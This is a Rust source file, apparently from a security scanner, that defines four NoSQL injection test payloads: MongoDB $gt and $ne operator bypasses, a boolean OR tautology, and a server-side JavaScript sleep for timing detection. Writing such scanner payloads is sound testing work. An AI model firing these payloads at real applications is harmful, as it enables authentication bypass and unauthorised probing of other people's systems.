use crate::domain::active_vuln::{ExpectedIndicator, PayloadDefinition};
use crate::domain::entities::SeverityLevel;
use uuid::Uuid;

pub fn get_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "{\"$gt\": \"\"}".to_string(),
            description: "NoSQL Injection: MongoDB tautology in JSON".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "|| 1==1".to_string(),
            description: "NoSQL Injection: Boolean OR evaluation".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "{\"$ne\": null}".to_string(),
            description: "NoSQL Injection: MongoDB Not Equal bypass".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "'; sleep(5000);'".to_string(),
            description: "NoSQL Injection: Server-side JS execution time delay".to_string(),
            expected_indicator: ExpectedIndicator::TimeDelay(4500),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
    ]
}
